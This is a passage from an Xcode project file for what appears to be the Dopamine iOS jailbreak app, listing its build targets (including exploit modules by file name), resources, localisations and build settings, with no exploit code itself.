				8C05B0082B63152B001A7CF3 /* PBXTargetDependency */,
				8C5FA8D92BDD36B6008C246F /* PBXTargetDependency */,
				8C5FA8E92BDD36BF008C246F /* PBXTargetDependency */,
			);
			name = Dopamine;
			packageProductDependencies = (
				8C46D7242B588973002899DB /* libzstd */,
			);
			productName = Dopamine;
			productReference = 8C7198152ABF0E82003C6658 /* Dopamine.app */;
			productType = "com.apple.product-type.application";
		};
		8CDD07A62B4F619000A32B61 /* kfd */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 8CDD07B22B4F619000A32B61 /* Build configuration list for PBXNativeTarget "kfd" */;
			buildPhases = (
				8CDD07A22B4F619000A32B61 /* Headers */,
				8CDD07A32B4F619000A32B61 /* Sources */,
				8CDD07A42B4F619000A32B61 /* Frameworks */,
				8C2B1FC42B52FA81009BA166 /* Resources */,
				8C4ABEB82B520C1600B43C9B /* Run Script */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = kfd;
			productName = kfd;
			productReference = 8CDD07A72B4F619000A32B61 /* kfd.framework */;
			productType = "com.apple.product-type.framework";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		8C71980D2ABF0E82003C6658 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastUpgradeCheck = 1500;
				TargetAttributes = {
					8C05B0022B63152B001A7CF3 = {
						CreatedOnToolsVersion = 15.2;
					};
					8C2B1FDE2B532374009BA166 = {
						CreatedOnToolsVersion = 15.1;
					};
					8C5FA8D32BDD36B6008C246F = {
						CreatedOnToolsVersion = 15.3;
					};
					8C5FA8E32BDD36BF008C246F = {
						CreatedOnToolsVersion = 15.3;
					};
					8C7198142ABF0E82003C6658 = {
						CreatedOnToolsVersion = 15.0;
					};
					8CDD07A62B4F619000A32B61 = {
						CreatedOnToolsVersion = 15.1;
					};
				};
			};
			buildConfigurationList = 8C7198102ABF0E82003C6658 /* Build configuration list for PBXProject "Dopamine" */;
			compatibilityVersion = "Xcode 14.0";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
				es,
				fr,
				de,
				ar,
				da,
				el,
				fil,
				it,
				ja,
				kk,
				ko,
				nl,
				pl,
				"pt-BR",
				ru,
				sv,
				tr,
				uk,
				ur,
				vi,
				"zh-HK",
				"zh-Hans",
				"zh-TW",
				"zh-CN",
				th,
			);
			mainGroup = 8C71980C2ABF0E82003C6658;
			packageReferences = (
				8C46D71C2B5887AC002899DB /* XCRemoteSwiftPackageReference "zstd" */,
			);
			productRefGroup = 8C7198162ABF0E82003C6658 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				8C7198142ABF0E82003C6658 /* Dopamine */,
				8CDD07A62B4F619000A32B61 /* kfd */,
				8C2B1FDE2B532374009BA166 /* dmaFail */,
				8C05B0022B63152B001A7CF3 /* badRecovery */,
				8C5FA8D32BDD36B6008C246F /* weightBufs */,
				8C5FA8E32BDD36BF008C246F /* multicast_bytecopy */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		8C05B0012B63152B001A7CF3 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C2B1FC42B52FA81009BA166 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C2B1FDD2B532374009BA166 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8D22BDD36B6008C246F /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C5FA91B2BDD47D5008C246F /* model_tmp.hwx in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8E22BDD36BF008C246F /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C7198132ABF0E82003C6658 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C609C9F2C19B6FA0023DD12 /* libkrw-dopamine.deb in Resources */,
				04DD0B372B7BA6180055DE4F /* LICENSE.md in Resources */,
				04DD0B3A2B7BF3E80055DE4F /* LICENSE_libc.md in Resources */,
				8C56D4CD2B7C118B001C03D3 /* LICENSE_kfd.md in Resources */,
				8C56D4BF2B7C0DF2001C03D3 /* LICENSE_ChOma.md in Resources */,
				8C56D4C22B7C0DF2001C03D3 /* LICENSE_Fugu15.md in Resources */,
				8C56D4C02B7C0DF2001C03D3 /* LICENSE_Fugu15_Rootful.md in Resources */,
				8C56D4C92B7C102B001C03D3 /* LICENSE_Sileo.md in Resources */,
				8C56D4C12B7C0DF2001C03D3 /* LICENSE_dimentio.md in Resources */,
				8C56D4C32B7C0DF2001C03D3 /* LICENSE_ElleKit.md in Resources */,
				8C56D4C52B7C0DF2001C03D3 /* LICENSE_opainject.md in Resources */,
				8C56D4C42B7C0DF2001C03D3 /* LICENSE_XPF.md in Resources */,
				8C56D4CB2B7C102B001C03D3 /* LICENSE_Zebra.md in Resources */,
				8C56D4CA2B7C102B001C03D3 /* LICENSE_Procursus.md in Resources */,
				8CCD2FC42B77AAA000F9C5DA /* basebin-link.deb in Resources */,
				8C05C5A02B75A17A0097A931 /* bootstrap_1900.tar.zst in Resources */,
				8C05C59F2B75A1770097A931 /* bootstrap_1800.tar.zst in Resources */,
				042479A42B66916B0082581B /* Credits.plist in Resources */,
				8C2875212BD850B4008B24DA /* LICENSE_libgrabkernel2.md in Resources */,
				8C512B912B5C9F9100C6F14A /* sileo.deb in Resources */,
				8C512B922B5C9F9400C6F14A /* zebra.deb in Resources */,
				8CCD8A882B6F16D0004B72B0 /* libroot.deb in Resources */,
				8C296BAE2BE05914007C2AD1 /* LICENSE_plooshinit.md in Resources */,
				8C5FA9712BDD81EF008C246F /* LICENSE_weightBufs.md in Resources */,
				8CB94F052B59E17A0098BAFD /* basebin.tar in Resources */,
				04DD0B592B7D19E60055DE4F /* Localizable.strings in Resources */,
				04C246B32B74B65900E17924 /* PkgManagers.plist in Resources */,
				04DD0B402B7CBD3D0055DE4F /* Themes.plist in Resources */,
				8CB94F042B59E17A0098BAFD /* basebin.tc in Resources */,
				8C7198282ABF0E84003C6658 /* LaunchScreen.storyboard in Resources */,
				8C7198252ABF0E84003C6658 /* Assets.xcassets in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		8C05B0122B631589001A7CF3 /* ShellScript */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "install_name_tool -change \"@loader_path/libjailbreak.dylib\" \"@executable_path/libjailbreak.dylib\" \"$BUILT_PRODUCTS_DIR/$EXECUTABLE_PATH\"\n";
		};
		8C2B1FED2B5323A3009BA166 /* Run Script */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Run Script";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "install_name_tool -change \"@loader_path/libjailbreak.dylib\" \"@executable_path/libjailbreak.dylib\" \"$BUILT_PRODUCTS_DIR/$EXECUTABLE_PATH\"\n";
		};
		8C4ABEB82B520C1600B43C9B /* Run Script */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Run Script";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "install_name_tool -change \"@loader_path/libjailbreak.dylib\" \"@executable_path/libjailbreak.dylib\" \"$BUILT_PRODUCTS_DIR/$EXECUTABLE_PATH\"\n";
		};
		8C5FA93D2BDD4FFF008C246F /* ShellScript */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "install_name_tool -change \"@loader_path/libjailbreak.dylib\" \"@executable_path/libjailbreak.dylib\" \"$BUILT_PRODUCTS_DIR/$EXECUTABLE_PATH\"\n";
		};
		8C5FA93E2BDD501C008C246F /* ShellScript */ = {
			isa = PBXShellScriptBuildPhase;
			alwaysOutOfDate = 1;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "install_name_tool -change \"@loader_path/libjailbreak.dylib\" \"@executable_path/libjailbreak.dylib\" \"$BUILT_PRODUCTS_DIR/$EXECUTABLE_PATH\"\n";
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		8C05AFFF2B63152B001A7CF3 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C05B0182B632925001A7CF3 /* badRecovery.s in Sources */,
				8C05B0142B6315DB001A7CF3 /* badRecovery.m in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C2B1FDB2B532374009BA166 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C2B1FF52B534C2F009BA166 /* dmaFail.c in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8D02BDD36B6008C246F /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C5FA9362BDD47D5008C246F /* ANEDirectIn.c in Sources */,
				8C5FA8F22BDD439A008C246F /* weightBufs.m in Sources */,
				8C5FA9352BDD47D5008C246F /* exploit.m in Sources */,
				8C5FA9382BDD47D5008C246F /* utils.c in Sources */,
				8C5FA9372BDD47D5008C246F /* IOGPU.c in Sources */,
				8C5FA9322BDD47D5008C246F /* IOSurface.c in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C5FA8E02BDD36BF008C246F /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C5FA9682BDD6C0C008C246F /* IOGPU.c in Sources */,
				8C5FA9692BDD6C0C008C246F /* spray.c in Sources */,
				8C5FA8F62BDD4480008C246F /* multicast_bytecopy.m in Sources */,
				8C5FA9652BDD6C0C008C246F /* exploit.c in Sources */,
				8C5FA9612BDD6C0C008C246F /* kernel_base.c in Sources */,
				8C5FA95F2BDD6C0C008C246F /* necp.c in Sources */,
				8C5FA95D2BDD6C0C008C246F /* port_utils.c in Sources */,
				8C5FA9672BDD6C0C008C246F /* kernel_rw.c in Sources */,
				8C5FA9662BDD6C0C008C246F /* mcast.c in Sources */,
				8C5FA95A2BDD6C0C008C246F /* IOSurfaceRoot.c in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8C7198112ABF0E82003C6658 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8C609C9E2C19B4270023DD12 /* NSString+Version.m in Sources */,
				042479A62B66916B0082581B /* DOHeaderCell.m in Sources */,
				8C6599DD2C555A71000FF57F /* DOPSJetsamListItemsController.h in Sources */,
				042479A22B66916B0082581B /* DOCreditsViewController.m in Sources */,
				042479B32B66916B0082581B /* DODebugLogView.m in Sources */,
				042479AF2B66916B0082581B /* DONavigationController.m in Sources */,
				04C246AE2B74ACA200E17924 /* DOAppSwitch.m in Sources */,
				8C6599DB2C555A60000FF57F /* DOPSJetsamListItemsController.m in Sources */,
				042479B22B66916B0082581B /* DOLyricsLogView.m in Sources */,
				042479A52B66916B0082581B /* DOCreditsCell.m in Sources */,
				8C296BAC2BE049E4007C2AD1 /* DOPSExploitListItemsController.m in Sources */,
				042479B82B66916B0082581B /* DOMainViewController.m in Sources */,
				8C029F432B4DFD5D0071DE58 /* DOExploitManager.m in Sources */,
				042479B02B66916B0082581B /* DOLoadingIndicator.m in Sources */,
				042479AC2B66916B0082581B /* DOJailbreakButton.m in Sources */,
				8CBF1A4A2EC3B71700EB2308 /* UIImage+JPEG2000.m in Sources */,
				8C4ABEBE2B52274300B43C9B /* DOPreferenceManager.m in Sources */,
				04DD0B472B7CBEEA0055DE4F /* DOTheme.m in Sources */,
				04DD0B442B7CBE2E0055DE4F /* DOThemeManager.m in Sources */,
				042479A92B66916B0082581B /* DOModalBackAction.m in Sources */,
				8CC139822B53DE6C00230143 /* NSData+Hex.m in Sources */,
				042479AE2B66916B0082581B /* DOUIManager.m in Sources */,
				8C71981A2ABF0E82003C6658 /* DOAppDelegate.m in Sources */,
				042479B72B66916B0082581B /* DOActionMenuView.m in Sources */,
				8C029F632B4E2E140071DE58 /* DOJailbreaker.m in Sources */,
				040622AA2B77FE8E00393AAD /* DOPkgManagerPickerViewController.m in Sources */,
				042479A82B66916B0082581B /* DOPSListController.m in Sources */,
				042479B12B66916B0082581B /* DODoubleHelixIndicator.m in Sources */,
				042479A72B66916B0082581B /* DOButtonCell.m in Sources */,
				042479B92B66916B0082581B /* DOGlobalAppearance.m in Sources */,
				8C9E46292ACA1CC700B5456A /* UIImage+Blur.m in Sources */,
				8C029F462B4DFD910071DE58 /* DOBootstrapper.m in Sources */,
				042479AD2B66916B0082581B /* DOHeaderView.m in Sources */,
				042479AB2B66916B0082581B /* DOModalTransitionScale.m in Sources */,
				04DD0B352B7BA38C0055DE4F /* DOLicenseViewController.m in Sources */,
				042479AA2B66916B0082581B /* DOModalTransitionPush.m in Sources */,
				0443A9B12B79D9C10014C933 /* DOPSListItemsController.m in Sources */,
				8C71982B2ABF0E84003C6658 /* main.m in Sources */,
				04DD0B3D2B7C88210055DE4F /* DOLogCrashViewController.m in Sources */,
				8C029F602B4E25350071DE58 /* DOEnvironmentManager.m in Sources */,
				04C246A12B73225800E17924 /* DODownloadViewController.m in Sources */,
				042479B52B66916B0082581B /* DOLyricsLogItemView.m in Sources */,
				8C029F4E2B4E1FF30071DE58 /* DOExploit.m in Sources */,
				04C2469D2B73220400E17924 /* DOUpdateCircleView.m in Sources */,
				04C246B12B74B05800E17924 /* DOPkgManagerPickerView.m in Sources */,
				042479B42B66916B0082581B /* DOProgressiveBlurView.m in Sources */,
				04C2469C2B73220400E17924 /* DOUpdateViewController.m in Sources */,
				042479B62B66916B0082581B /* DOActionMenuButton.m in Sources */,
				8C71981D2ABF0E82003C6658 /* DOSceneDelegate.m in Sources */,
				042479A32B66916B0082581B /* DOSettingsController.m in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		8CDD07A32B4F619000A32B61 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				8CDD08342B4F63E100A32B61 /* kfd.m in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		8C05B0082B63152B001A7CF3 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 8C05B0022B63152B001A7CF3 /* badRecovery */;
			targetProxy = 8C05B0072B63152B001A7CF3 /* PBXContainerItemProxy */;
		};
		8C2B1FE42B532374009BA166 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 8C2B1FDE2B532374009BA166 /* dmaFail */;
			targetProxy = 8C2B1FE32B532374009BA166 /* PBXContainerItemProxy */;
		};
		8C5FA8D92BDD36B6008C246F /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 8C5FA8D32BDD36B6008C246F /* weightBufs */;
			targetProxy = 8C5FA8D82BDD36B6008C246F /* PBXContainerItemProxy */;
		};
		8C5FA8E92BDD36BF008C246F /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 8C5FA8E32BDD36BF008C246F /* multicast_bytecopy */;
			targetProxy = 8C5FA8E82BDD36BF008C246F /* PBXContainerItemProxy */;
		};
		8CDD07AC2B4F619000A32B61 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 8CDD07A62B4F619000A32B61 /* kfd */;
			targetProxy = 8CDD07AB2B4F619000A32B61 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		04DD0B5B2B7D19E60055DE4F /* Localizable.strings */ = {
			isa = PBXVariantGroup;
			children = (
				04DD0B5A2B7D19E60055DE4F /* en */,
				04DD0B5D2B7D1A210055DE4F /* es */,
				04DD0B5C2B7D1A210055DE4F /* fr */,
				049D52042B7E7C1D00389436 /* ar */,
				049D52052B7E7C2500389436 /* da */,
				049D52062B7E7C3500389436 /* de */,
				049D52072B7E7C4700389436 /* el */,
				049D52082B7E7C6B00389436 /* fil */,
				049D52092B7E7C7600389436 /* it */,
				049D520A2B7E7C8F00389436 /* ja */,
				049D520B2B7E7CCA00389436 /* kk */,
				049D520C2B7E7CD300389436 /* ko */,
				049D520D2B7E7D3500389436 /* nl */,
				049D520E2B7E7D3E00389436 /* pl */,
				049D520F2B7E7D4700389436 /* pt-BR */,
				049D52102B7E7D4F00389436 /* ru */,
				049D52112B7E7D5700389436 /* sv */,
				049D52122B7E7D6200389436 /* tr */,
				049D52132B7E7D7000389436 /* uk */,
				049D52142B7E7D7B00389436 /* ur */,
				049D52152B7E7D8200389436 /* vi */,
				049D52192B7E7E1600389436 /* zh-HK */,
				049D521C2B7E7EB300389436 /* zh-Hans */,
				049D521D2B7E7EDA00389436 /* zh-TW */,
				049D521E2B7E7F1C00389436 /* zh-CN */,
				C075B0CB2B8F2BCE009A26BB /* th */,
			);
			name = Localizable.strings;
			sourceTree = "<group>";
		};
		8C7198262ABF0E84003C6658 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				8C7198272ABF0E84003C6658 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		8C05B00C2B63152C001A7CF3 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				"CODE_SIGN_IDENTITY[sdk=macosx*]" = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/badRecovery/Info.plist";
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.badRecovery;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Debug;
		};
		8C05B00D2B63152C001A7CF3 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				"CODE_SIGN_IDENTITY[sdk=macosx*]" = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/badRecovery/Info.plist";
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.badRecovery;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Release;
		};
		8C2B1FE82B532374009BA166 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/dmaFail/Info.plist";
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.dmaFail;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Debug;
		};
		8C2B1FE92B532374009BA166 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/dmaFail/Info.plist";
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.dmaFail;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Release;
		};
		8C5FA8DC2BDD36B6008C246F /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/weightBufs/Info.plist";
				INFOPLIST_KEY_CFBundleDisplayName = weightBufs;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.weightBufs;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Debug;
		};
		8C5FA8DD2BDD36B6008C246F /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/weightBufs/Info.plist";
				INFOPLIST_KEY_CFBundleDisplayName = weightBufs;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = com.opa334.weightBufs;
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
				VERSIONING_SYSTEM = "apple-generic";
				VERSION_INFO_PREFIX = "";
			};
			name = Release;
		};
		8C5FA8ED2BDD36BF008C246F /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEFINES_MODULE = YES;
				DEVELOPMENT_TEAM = 3Z56NQJ65R;
				DYLIB_COMPATIBILITY_VERSION = 1;
				DYLIB_CURRENT_VERSION = 1;
				DYLIB_INSTALL_NAME_BASE = "@rpath";
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "$(SRCROOT)/Dopamine/Exploits/multicast_bytecopy/Info.plist";
				INFOPLIST_KEY_CFBundleDisplayName = multicast_bytecopy;
				INFOPLIST_KEY_NSHumanReadableCopyright = "";
				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
				IPHONEOS_DEPLOYMENT_TARGET = 15.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
				MODULE_VERIFIER_SUPPORTED_LANGUAGES = "objective-c objective-c++";
				MODULE_VERIFIER_SUPPORTED_LANGUAGE_STANDARDS = "gnu17 gnu++20";
				PRODUCT_BUNDLE_IDENTIFIER = "com.opa334.multicast-bytecopy";
				PRODUCT_NAME = "$(TARGET_NAME:c99extidentifier)";
				SKIP_INSTALL = YES;
				SWIFT_EMIT_LOC_STRINGS = YES;
				TARGETED_DEVICE_FAMILY = "1,2";
